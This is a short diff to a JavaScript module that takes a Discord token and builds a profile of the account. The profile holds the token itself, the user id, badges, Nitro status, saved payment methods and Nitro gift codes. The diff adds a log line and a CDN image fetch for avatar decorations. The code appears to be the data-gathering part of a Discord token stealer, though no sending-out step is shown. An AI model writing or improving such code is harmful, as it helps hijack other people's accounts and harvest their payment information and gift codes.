@@ -175,13 +175,15 @@ module.exports = (token) => {
     if (s.email) acc.push(emojis.user.payments[1]);
     return acc;
   }, []).join('');
+
+  console.log(p)
   const g = entitlements.length > 0 ? entitlements.map(s => `${s}, `).join('') : "Nitro Gifts Codes Not Found";
   return {
     all: {
       token: token,
       id: user.id,
       global_name: `${user.global_name}`,
-      avatar_decoration: user.avatar_decoration_data ? { ...user.avatar_decoration_data } : "Avatar Decoration Not Found",
+      avatar_decoration: user.avatar_decoration_data ? getImage(`https://cdn.discordapp.com/avatar-decoration-presets/${user.avatar_decoration_data.asset}`) : "Avatar Decoration Not Found",
       username: `${user.username}#${user.discriminator}`,
       badges: AllBadges(user.flags),
       nitro_type: getNitroPremium(profile),
